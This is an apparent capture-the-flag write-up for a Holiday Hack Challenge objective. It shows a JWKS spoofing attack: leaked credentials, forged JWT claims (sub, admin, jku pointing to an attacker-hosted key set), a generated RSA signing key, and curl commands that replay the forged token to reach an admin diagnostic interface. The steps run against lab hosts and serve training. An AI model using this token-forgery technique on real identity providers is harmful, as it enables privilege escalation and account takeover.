---
nav: |
  <table>
  <thead><tr><th><a href="/HHC_2025/act2_dosis_network_down_mjd.html">Previous Objective: Act2 Dosis Network Down</a></th> <th><a href="/HHC_2025/index.html">Home Page</a></th> <th><a href="/HHC_2025/act2_quantgnome_leap_mjd.html">Next Objective: Act2 Quantgnome Leap</a></th></table>
---
<table>
<thead><tr><th>Objective: Rogue Gnome Identity Provider</th> <th>Difficulty Level: 2</th><tr><td>Hike over to Paul in the park for a gnomey authentication puzzle adventure. What malicious firmware image are the gnomes downloading?</td> <td>Location: Dosis Neighborhood Park</td></table>
<h2>Solution Overview</h2>
The attack begins by using exposed gnome credentials (gnome:SittingOnAShelf) to authenticate against the Identity Provider (IDP). This login returns a JSON Web Token (JWT), which is then analyzed. By exploiting weaknesses in JWT validation, the attacker modifies critical claims: changing the subject (sub) from gnome to santa, flipping the admin flag from false to true, and redirecting the jku field to a malicious JWKS file hosted on their own server.
To support the attack, the attacker generates a fraudulent RSA key pair and publishes the public key in their rogue JWKS file, while signing the tampered token with the private key. The manipulated token is then passed to the target service, which incorrectly validates it against the attacker-controlled JWKS endpoint. This grants unauthorized access and a valid session cookie. Finally, the attacker uses the session to connect to the diagnostic interface, retrieving sensitive data â€” in this case, the file refrigeration-botnet.bin.
<table>
<thead><tr><th>Activity</th> <th>Primary Tactic</th> <th>MITRE ATT&CK Technique ID</th> <th>MITRE ATT&CK Technique Name</th><tr><td>Collecting exposed gnome credentials</td> <td>Credential Access</td> <td>T1552.001</td> <td>Unsecured Credentials: Passwords</td><tr><td>Authenticating to IDP and analyzing JWT</td> <td>Defense Evasion</td> <td>T1140</td> <td>Deobfuscate/Decode Files or Information</td><tr><td>Modifying JWT claims (<code>sub</code>, <code>admin</code>, <code>jku</code>)</td> <td>Defense Evasion</td> <td>T1600</td> <td>Modify Authentication Process</td><tr><td>Introducing fraudulent JWKS/public key</td> <td>Defense Evasion</td> <td>T1550.003</td> <td>Use Alternate Authentication Material</td><tr><td>Passing tampered token for access</td> <td>Persistence/Lateral Movement</td> <td>T1078.004</td> <td>Valid Accounts: SSH/Other</td><tr><td>Using session cookie to access diagnostics</td> <td>Impact</td> <td>T1499</td> <td>Endpoint Denial/Manipulation</td></table>
<h2>Detailed Solution</h2>
<details>
<summary>Click to expand</summary>
<p>URL: </p>
<p>http://paulweb.neighborhood/</p>
<p>Useful resources for understading how JSON Web Tokens work:</p>
<p>https://github.com/ticarpi/jwt_tool/wiki</p>
<p>https://portswigger.net/web-security/jwt</p>
<p>The notes.txt file contains some useful commands and a set of credentials:</p>
<pre><code>
<h1>Credentials</h1>
<h2>Gnome credentials (found on a post-it):</h2>
Gnome:SittingOnAShelf
<h1>Curl Commands Used in Analysis of Gnome:</h1>
<h2>Gnome Diagnostic Interface authentication required page:</h2>
curl http://gnome-48371.atnascorp
<h2>Request IDP Login Page</h2>
curl http://idp.atnascorp/?return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth
<h2>Authenticate to IDP</h2>
curl -X POST --data-binary $&#39;username=gnome&amp;password=SittingOnAShelf&amp;return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth&#39; http://idp.atnascorp/login
<h2>Pass Auth Token to Gnome</h2>
curl -v http://gnome-48371.atnascorp/auth?token=&lt;insert-JWT&gt;
<h2>Access Gnome Diagnostic Interface</h2>
curl -H &#39;Cookie: session=&lt;insert-session&gt;&#39; http://gnome-48371.atnascorp/diagnostic-interface
<h2>Analyze the JWT</h2>
jwt_tool.py &lt;insert-JWT&gt;
</code></pre>
<p>Using the authenticate curl command from the notes combined with the credentials to login:</p>
<pre><code>
paul@paulweb:~$ curl -X POST --data-binary $&#39;username=gnome&amp;password=SittingOnAShelf&amp;return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth&#39; http://idp.atnascorp/loginp/login
&lt;!doctype html&gt;
&lt;html lang=en&gt;
&lt;title&gt;Redirecting...&lt;/title&gt;
&lt;h1&gt;Redirecting...&lt;/h1&gt;
&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=&quot;http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2Mjc4ODkxNCwiZXhwIjoxNzYyNzk2MTE0LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.tUTjpDOvj1Yt0gRiLRT9LbD-L1cXfO2vrE0V0OzsV7zJi9THXE91feKN8KarI4Zf0MFgqFWc2I__dUbdpZpURBUaWW1HtLyNkwtzXGrAJuP0n7GM2ZnoK-EKTba1D9TBMOt4gyV_2jaA4QQcU32Oox9m-_GevjGJfL5PMpX1cAqLKQ_TfDxWiLyRYYKKjduEjIKYzC7pHLz_YGcYmmD855FW3FUA8AXJLn3XATnKgvqvHok_kE4HIWNWBvaXLmAD0lOWRloOhIptAMWnbTFAI7Y9YGCP0YMjZ4QUP2DTsgM7cYLSxwGAdWaTZpPm0ZUezw-ssT8wwMeF331SyGjwKg&quot;&gt;http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2Mjc4ODkxNCwiZXhwIjoxNzYyNzk2MTE0LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.tUTjpDOvj1Yt0gRiLRT9LbD-L1cXfO2vrE0V0OzsV7zJi9THXE91feKN8KarI4Zf0MFgqFWc2I__dUbdpZpURBUaWW1HtLyNkwtzXGrAJuP0n7GM2ZnoK-EKTba1D9TBMOt4gyV_2jaA4QQcU32Oox9m-_GevjGJfL5PMpX1cAqLKQ_TfDxWiLyRYYKKjduEjIKYzC7pHLz_YGcYmmD855FW3FUA8AXJLn3XATnKgvqvHok_kE4HIWNWBvaXLmAD0lOWRloOhIptAMWnbTFAI7Y9YGCP0YMjZ4QUP2DTsgM7cYLSxwGAdWaTZpPm0ZUezw-ssT8wwMeF331SyGjwKg&lt;/a&gt;. If not, click the link.
</code></pre>
<p>The response includes a token:</p>
<pre><code>
eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2Mjc4ODkxNCwiZXhwIjoxNzYyNzk2MTE0LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.tUTjpDOvj1Yt0gRiLRT9LbD-L1cXfO2vrE0V0OzsV7zJi9THXE91feKN8KarI4Zf0MFgqFWc2I__dUbdpZpURBUaWW1HtLyNkwtzXGrAJuP0n7GM2ZnoK-EKTba1D9TBMOt4gyV_2jaA4QQcU32Oox9m-_GevjGJfL5PMpX1cAqLKQ_TfDxWiLyRYYKKjduEjIKYzC7pHLz_YGcYmmD855FW3FUA8AXJLn3XATnKgvqvHok_kE4HIWNWBvaXLmAD0lOWRloOhIptAMWnbTFAI7Y9YGCP0YMjZ4QUP2DTsgM7cYLSxwGAdWaTZpPm0ZUezw-ssT8wwMeF331SyGjwKg
</code></pre>
<p>Using JWT.IO to decode the token:</p>
<p>!<a href="/HHC_2025/images/roguegnomeidp_jwt.jpg">Decoding the token</a> </p>
<p>Lets look at the contents of the jwks.json file:</p>
<pre><code>
&lt;/html&gt;paul@paulweb:~$ curl -v http://idp.atnascorp/.well-known/jwks.json 
<em> Host idp.atnascorp:80 was resolved.
</em> IPv6: (none)
<em> IPv4: 127.0.0.1
</em>   Trying 127.0.0.1:80...
* Connected to idp.atnascorp (127.0.0.1) port 80
&gt; GET /.well-known/jwks.json HTTP/1.1
&gt; Host: idp.atnascorp
&gt; User-Agent: curl/8.5.0
&gt; Accept: <em>/</em>
&gt; 
&lt; HTTP/1.1 200 OK
&lt; Date: Mon, 10 Nov 2025 16:40:39 GMT
&lt; Server: Werkzeug/3.0.1 Python/3.12.3
&lt; Content-Type: application/json
&lt; Content-Length: 476
&lt; 
{
  &quot;keys&quot;: [
    {
      &quot;e&quot;: &quot;AQAB&quot;,
      &quot;kid&quot;: &quot;idp-key-2025&quot;,
      &quot;kty&quot;: &quot;RSA&quot;,
      &quot;n&quot;: &quot;7WWfvxwIZ44wIZqPFP9EEemmwMhKgBakYPx736W5gGD8YJlmMzanxdi8NANJ6kyMN-ErFOKJuIQn01PmAeq7On4OCwLyQpB5dHXiidZPRjb2lbrrL1k32svdeo6VGCnzdrGu6KtDHxHn8m9H3WqGVmi2OmCZsk6fJbnoklnJaFiygUkC4IMbk92cbYvajPTqV9C6yWCROPagxQFmybq1hNJoY-FRntEKwBN89Dow8d-PsGMten3CmzDQ9o8rXKs6euk9xLfX06og5Wm1aKJk686WzhtqgdmBjqt2w34EJGlEL0ZSvPdB9nPqxao83N-ah-IYeoiCnSUBKjXI-IRSjQ&quot;,
      &quot;use&quot;: &quot;sig&quot;
    }
  ]
}
</code></pre>
<p>The /etc/passwd file is accessible. The username "santa" looks like a good one to use in the attack.</p>
<p>!<a href="/HHC_2025/images/roguegnomeidp_passwdfile.jpg">Contents of the Password file</a> </p>
<p>Using mkjwk - JSON Web Key Generator, generate the json web key:</p>
<p>!<a href="/HHC_2025/images/roguegnomeidp_keys.jpg">Generating JSON Web Key</a> </p>
<pre><code>
e: AQAB
n: hJwH0hvuZC3HVpQocwmk76t8wQQOXWETMHnRuP_GlUHYpNZOQv2CKf2PAKLqD3uHubsdB8MPRPER2qqcIFKg9kR_CZBeEQkheALPCd6jNfPjqX7ic-PYB5VMXiV86QK6dxw9ecJUkKa5Ub_mK_KdCX03o0r-lZxsqxL_19Rv2eF8BEzWxClm_HFEaaJ3006MKjB6m2gM4eCezhywZOtJw0aZhpImD8VroPhMZ24OB-ml3jkCJfzHkMz8gybbIuxCTpcIcgf3U3H7lw7HiH2GdwT67yF03P3KMYTwjkCxpvueP9sFFmQpBcfocvkj2U1irLfZ9tbNJqKYuPNSd8H3_w
{
    &quot;kty&quot;: &quot;RSA&quot;,
    &quot;e&quot;: &quot;AQAB&quot;,
    &quot;use&quot;: &quot;sig&quot;,
    &quot;kid&quot;: &#226;€œidp-key-2025&quot;,
    &quot;alg&quot;: &quot;RS256&quot;,
    &quot;n&quot;: &quot;hJwH0hvuZC3HVpQocwmk76t8wQQOXWETMHnRuP_GlUHYpNZOQv2CKf2PAKLqD3uHubsdB8MPRPER2qqcIFKg9kR_CZBeEQkheALPCd6jNfPjqX7ic-PYB5VMXiV86QK6dxw9ecJUkKa5Ub_mK_KdCX03o0r-lZxsqxL_19Rv2eF8BEzWxClm_HFEaaJ3006MKjB6m2gM4eCezhywZOtJw0aZhpImD8VroPhMZ24OB-ml3jkCJfzHkMz8gybbIuxCTpcIcgf3U3H7lw7HiH2GdwT67yF03P3KMYTwjkCxpvueP9sFFmQpBcfocvkj2U1irLfZ9tbNJqKYuPNSd8H3_w&quot;
}
</code></pre>
<p>Create the PEM file from the JSON Web Key using jwk to pem convertor (https://8gwifi.org/jwkconvertfunctions.jsp)</p>
<pre><code>
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAhJwH0hvuZC3HVpQocwmk76t8wQQOXWETMHnRuP/GlUHYpNZO
Qv2CKf2PAKLqD3uHubsdB8MPRPER2qqcIFKg9kR/CZBeEQkheALPCd6jNfPjqX7i
c+PYB5VMXiV86QK6dxw9ecJUkKa5Ub/mK/KdCX03o0r+lZxsqxL/19Rv2eF8BEzW
xClm/HFEaaJ3006MKjB6m2gM4eCezhywZOtJw0aZhpImD8VroPhMZ24OB+ml3jkC
JfzHkMz8gybbIuxCTpcIcgf3U3H7lw7HiH2GdwT67yF03P3KMYTwjkCxpvueP9sF
FmQpBcfocvkj2U1irLfZ9tbNJqKYuPNSd8H3/wIDAQABAoIBAEtLOJmQ6GOTJpq/
FtRyhmba7MO/JNTaWIXutSigecWnlHXLhLY+sJhc8sQ+vD08O402c75Df7j6U9Pf
iTRFFkWeEK+CfBaaI5m7poiJFAx/RSWo+LUqii+MEsdl6611siANNc6bi15ye8ix
9+O+JnIL2fpqi3CxV3YvHHsUkMmZjwFaxWbVjCmmWj2dZs61hWAqcuiFPPJN0qOz
aH94R5xUVbgQ5lE2xUXaXAitYtTIU36W5DOGuAzoJhZr88QwPsTIOuejJgeAebQc
KjaPGPIggQLZ8X41vISIKLk4XAcM3ZdfBShOJp6Lf3uF9/RrnHLGBlk+NLHwKEjb
GfqkJ9kCgYEAxjitJLJOCCz8qtfz4IiX8Xx4XNzs+XJWHSh5b5ZzxP4VHow/HLWA
s4yKoUMYyrqJZRBz0hKVfelZMYn7JZ9cB821MukKrp+NXyjMPArjIJLWsLQ9MJqg
ZNAtiWCfKoZtWJ1wIqzYHtpgmRfnFeMXlifFh3OULvz/eVuhd/i/IWUCgYEAq0Nh
Sqgy9KYJRUlIWx8Q+aXe5X73bEwAjivcLJ9SaLe1oAPq0gaAMo33qz6vrdqKCBTT
8HTa0jmvgG9UPivJD9llblAu9umbK0NBhIC16c0HD6BeCqXPIgMzt2LKK9vCdrnr
06VwgDhdNBrr1afeBZq0KdvcIa48vo90y+t7b5MCgYEAu95Hq/oanwEUUE/w4qRT
bhsMcOcq6pkFKQmNXsd33gL6vUMrJeiYnJPdaE4Rl0MIqXLYcwgOC5I4aQ1frR7G
uNasoB3jc/HgqYofV+Dxt5O0SzHotMI4tpPgNM4QzNsvk8dT2ml7RHKxDyhqaoIb
fsMfIevXTFmZQMop1W06qUkCgYBUVYnDSbBN6LUH+V44AMRLKvLn7+3G1mYvnEl/
b7UU++HkOgmYArt+KYqcOPIpmkP+VsNG1UQr4Vwa0reZJdaMh3D7MWDvFXnjg+rv
ZLIvv1aKy12DwMKO7SS6WVtU3ZKVBFisj/smKJs83UTkoRUjjVrKggmUTEh9Tgcl
o3/VIQKBgHX31e9bbXhE9djtorJYbtooc9zuP0ORKFGJWTSCoj6Y/HxetewZHV2S
+bWGuBTkTb4b9jHhUOcyBJpuuWtfnFg+db7mTnez1wsQffcde5BHcn8KUSbGrnIR
9UjGRQC4CNPXlEmAQ9PA9l06g/J4iJx6NYCGhW0GaxxUiE9mqRN3
-----END RSA PRIVATE KEY----- 
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAhJwH0hvuZC3HVpQocwmk
76t8wQQOXWETMHnRuP/GlUHYpNZOQv2CKf2PAKLqD3uHubsdB8MPRPER2qqcIFKg
9kR/CZBeEQkheALPCd6jNfPjqX7ic+PYB5VMXiV86QK6dxw9ecJUkKa5Ub/mK/Kd
CX03o0r+lZxsqxL/19Rv2eF8BEzWxClm/HFEaaJ3006MKjB6m2gM4eCezhywZOtJ
w0aZhpImD8VroPhMZ24OB+ml3jkCJfzHkMz8gybbIuxCTpcIcgf3U3H7lw7HiH2G
dwT67yF03P3KMYTwjkCxpvueP9sFFmQpBcfocvkj2U1irLfZ9tbNJqKYuPNSd8H3
/wIDAQAB
-----END PUBLIC KEY-----
</code></pre>
<p>Using JWT.io change the minimal number of items. The hint says gnome has insufficient permission, so we must change sub, admin and jku.</p>
<p>- sub changes from "gnome" to "santa"</p>
<p>- admin changes from "false" to "true"</p>
<p>- jku changes from "http://idp.atnascorp/.well-known/jwks.json" to "http:/paulweb.neighborhood/jwks.json"</p>
<p>The token is signed using the Private key generated. The public key and the fraudulent JWKS file is placed in the www directory of paulweb.neighborhood.</p>
<p>!<a href="/HHC_2025/images/roguegnomeidp_tamperedjwt.jpg">Creating a Tampered Token</a>  </p>
<p>Tampered token:</p>
<pre><code>
eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9qd2tzLmpzb24iLCJraWQiOiJpZHAta2V5LTIwMjUiLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJzYW50YSIsImlhdCI6MTc2MjgxNjQ0NSwiZXhwIjoxNzYyODIzNjQ1LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.SHLrimPcjayFmHcgSAebHW_iLP1HErl_ce_NCoM2N4qGtOLmjzKUSFmahHECCW5ax0D2DEsAU77ghYjXTfOAOteLxeIlDs9csn0FMBzLCqROWRjW8setWVlfd0T98jwhopj78uk3pcRmkzuDH9gAUt46c3qic9y34LpEJm6DICh2h76UTlBVowIfbHr3KMDoernoFHThKPUEqEoEaredjt31xuQbDoZ844IPciovLnF9D83cbZoCzki0U93xfPuUAQszILY5iku76AhjCF6QTu25oXIxHs5MXn7wi6Pl5VlHLndz3S2bbnI5NnaVwtjpw7p33VfAYP-4fGvGdEMASA
</code></pre>
<p>Now the tampered token is passed to gnome for a valid session key:</p>
<pre><code>
curl -v http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9qd2tzLmpzb24iLCJraWQiOiJpZHAta2V5LTIwMjUiLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJzYW50YSIsImlhdCI6MTc2MjgxNjQ0NSwiZXhwIjoxNzYyODIzNjQ1LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.SHLrimPcjayFmHcgSAebHW_iLP1HErl_ce_NCoM2N4qGtOLmjzKUSFmahHECCW5ax0D2DEsAU77ghYjXTfOAOteLxeIlDs9csn0FMBzLCqROWRjW8setWVlfd0T98jwhopj78uk3pcRmkzuDH9gAUt46c3qic9y34LpEJm6DICh2h76UTlBVowIfbHr3KMDoernoFHThKPUEqEoEaredjt31xuQbDoZ844IPciovLnF9D83cbZoCzki0U93xfPuUAQszILY5iku76AhjCF6QTu25oXIxHs5MXn7wi6Pl5VlHLndz3S2bbnI5NnaVwtjpw7p33VfAYP-4fGvGdEMASA
</code></pre>
<p>The session key is used to connect to the diagntic interface:</p>
<pre><code>
curl -H &#39;Cookie: session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJzYW50YSJ9.aRJ4Fw.oA20V3TpQ5ST2sky_K3XDsllPSs; &#39; http://gnome-48371.atnascorp/diagnostic-interface
</code></pre>
<p>!<a href="/HHC_2025/images/roguegnomeidp_diagnostic.jpg">Getting the Diagnostic Interface</a>   </p>
<p><strong>Answer:refrigeration-botnet.bin</strong></p>
</details>
<h2>Tools Reference</h2>
<table>
<thead><tr><th>Tools Used</th> <th>Tool Version</th><tr><td>curl</td> <td>8.11.0</td> <td></td><tr><td><a href="https://JWT.IO">JSON Web Token (JWT) Debugger</a></td> <td>N/A</td><tr><td><a href="https://8gwifi.org/jwkconvertfunctions.jsp">JWK to PEM Converter</a></td> <td>N/A</td> <td></td><tr><td><a href="https://mkjwk.org/">JSON Web Key generator</a></td> <td>N/A</td></table>
<h2>Hints Reference</h2>
<table>
<thead><tr><th>Provided By</th> <th>Hint</th><tr><td>Santa</td> <td>If you need to host any files for the attack, the server is running a webserver available locally at http://paulweb.neighborhood/ . The files for the site are stored in ~/www</td><tr><td>Santa</td> <td>https://github.com/ticarpi/jwt_tool/wiki and https://portswigger.net/web-security/jwt have some great information on analyzing JWT's and performing JWT attacks.</td><tr><td>Santa</td> <td>It looks like the JWT uses JWKS. Maybe a JWKS spoofing attack would work.</td><tr><td>Paul</td> <td>As a pentester, I proper love a good privilege escalation challenge, and that's exactly what we've got here. I've got access to a Gnome's Diagnostic Interface at gnome-48371.atnascorp with the creds gnome:SittingOnAShelf, but it's just a low-privilege account. The gnomes are getting some dodgy updates, and I need admin access to see what's actually going on. Ready to help me find a way to bump up our access level, yeah?</td></table>
<h2>Acknowledgements</h2>
<table>
<thead><tr><th>Provided By</th> <th>Notes</th><tr><td>eucrates</td> <td>suggested using the jwk to pem convertor website (https://8gwifi.org/jwkconvertfunctions.jsp)</td></table>
<table>
<thead><tr><th><a href="/HHC_2025/act2_dosis_network_down_mjd.html">Previous Objective: Act2 Dosis Network Down</a></th> <th><a href="/HHC_2025/index.html">Home Page</a></th> <th><a href="/HHC_2025/act2_quantgnome_leap_mjd.html">Next Objective: Act2 Quantgnome Leap</a></th></table>